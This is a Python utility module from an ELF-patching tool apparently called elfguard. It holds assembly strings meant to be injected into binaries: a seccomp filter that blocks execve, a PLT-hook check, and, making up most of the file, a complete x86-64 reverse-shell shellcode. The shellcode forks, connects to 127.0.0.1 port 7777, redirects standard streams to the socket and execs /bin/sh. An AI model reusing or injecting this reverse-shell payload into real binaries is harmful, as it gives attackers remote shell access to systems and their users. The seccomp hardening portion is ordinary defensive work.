# date: 2019-03-22
# author: thinkycx

"""
util.py

provide some util functions ...
"""

from pwn import ELF, disasm, log


def showMenu(usage):
    menu = '''
    ______ __     ______ ______                         __
   / ____// /    / ____// ____/__  __ ____ _ _____ ____/ /
  / __/  / /    / /_   / / __ / / / // __ `// ___// __  / 
 / /___ / /___ / __/  / /_/ // /_/ // /_/ // /   / /_/ /  
/_____//_____//_/     \____/ \__,_/ \__,_//_/    \__,_/                             
                                    [*] thinkycx@gmail.com
                                    [*] github.com/thinkycx/elfguard
    '''

    menu_usage = 'Usage:  python elfguard.py <FILENAME>\n'

    print menu
    if usage:
        print menu_usage

def replaceStr(str, start, piece):
    '''
    use split to add a piece string into a string as a string is not editable
    :param str: raw string                      e.g. '1234567890'
    :param start: start position                e.g. 'abc'
    :param piece: a piece string                e.g. '3'
    :return: the new string                     e.g. '123abc4567890'
    '''
    return str[0:start] + piece + str[start+len(piece):]


def showDisasm(filename, vaddr, length):
    """
    show disassembly code at offset
    :param filename:
    :param vaddr:
    :param length:
    :return:
    """
    elf = ELF(filename, checksec=False)
    offset = elf.vaddr_to_offset(vaddr)
    with open(filename, 'rb+') as fd:
        fd.seek(offset, 0)
        assembly = fd.read(length)

    disassembly = disasm(assembly, vma=vaddr)
    log.info("\t filename: %s vaddr: 0x%x disasmmbly: %s " % (filename, vaddr, disassembly))

'''
    # see func@PLT disasm
    # fd.seek(func_plt_addr & 0xfffff, 0)                                # get file
    # plt_first_asm = fd.read(6)
    # plt_disasm = disasm(plt_first_asm, arch='amd64', os='linux')
    # log.info("\t disasm: " + plt_disasm)
'''



# Check GOT value, only suitable for ELF with Lazy binding 
plt_hook_condition = '''             
mov rax, 0x%x;
mov r14, qword ptr [rax];
cmp r14, 0x%x;
jne plt_hook_end ;
'''
# jne 32addr ;  Opcode is \x0f\x85, however pwntools cannot asm it.


# got_addr plt_addr+6 plt_addr

shellcode_seccomp = '''
push r13;
push r12;
push rbp;
mov rbp, rsp;
sub rsp, 0x100;
mov rax,0x0000000000000006;
push rax;
mov rax,0x7fff000000000006;
push rax;
mov rax,0x0000003b00010015;
push rax;
mov rax,0x4000000000020035;
push rax;
mov rax,0x0000000000000020;
push rax;
mov rax,0xc000003e04000015;
push rax;
mov rax,0x0000000400000020;
push rax;
mov r12, rsp;
push r12;
push 0x7;

mov r13, rsp;
mov r8, 0;
mov ecx, 0;
mov edx, 0;
mov esi, 1;
mov edi, 0x26;
mov eax, 157;
syscall;

mov rdx, r13;
mov esi, 2;
mov edi, 0x16;
mov eax, 157;
syscall;

mov rsp, rbp;
pop rbp;
pop r12;
pop r13;
plt_hook_end:
'''

'''

'''

save_registers = '''
push rax
push rdi
push rsi
push rdx
push rcx
push r8
push r9
push rbp
'''

restore_registers = '''
pop rbp
pop r9
pop r8
pop rcx
pop rdx
pop rsi
pop rdi
pop rax
'''

reverse_shell_shellcode_execute = '''
    /* fork() */
    /* setregs noop */
    /* call fork() */
    push SYS_fork /* 0x39 */
    pop rax
    syscall
cmp rax, 1;
 jnl fork_fork_shellcode_end;
    /* fork() */
    /* setregs noop */
    /* call fork() */
    push SYS_fork /* 0x39 */
    pop rax
    syscall
    cmp rax, 1
    jl forkexit_4
    /* exit(status=0) */
    xor edi, edi /* 0 */
    /* call exit() */
    push SYS_exit /* 0x3c */
    pop rax
    syscall
forkexit_4:
    /* open new socket */
    /* open new socket */
    /* call socket(2, Constant('SOCK_STREAM', 0x1), 0) */
    push SYS_socket /* 0x29 */
    pop rax
    push 2
    pop rdi
    push SOCK_STREAM /* 1 */
    pop rsi
    cdq /* rdx=0 */
    syscall

    /* Put socket into rbp */
    mov rbp, rax

    /* Create address structure on stack */
    /* push '\x02\x00\x1ea\x7f\x00\x00\x01' */
    mov rax, 0x201010101010101
    push rax
    mov rax, 0x201010101010101 ^ 0x100007f611e0002
    xor [rsp], rax

    /* Connect the socket */
    /* call connect('rbp', 'rsp', 16) */
    push SYS_connect /* 0x2a */
    pop rax
    mov rdi, rbp
    push 0x10
    pop rdx
    mov rsi, rsp
    syscall
    /* dup() file descriptor rbp into stdin/stdout/stderr */
dup_1:
    /* moving rbp into rbp, but this is a no-op */

    push 3
loop_2:
    pop rsi
    dec rsi
    js after_3
    push rsi

    /* call dup2('rbp', 'rsi') */
    push SYS_dup2 /* 0x21 */
    pop rax
    mov rdi, rbp
    syscall

    jmp loop_2
after_3:

    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
fork_fork_shellcode_end:
 nop; nop; nop;
'''



reverse_shell_shellcode = reverse_shell_shellcode_execute # save_registers + reverse_shell_shellcode_execute + restore_registers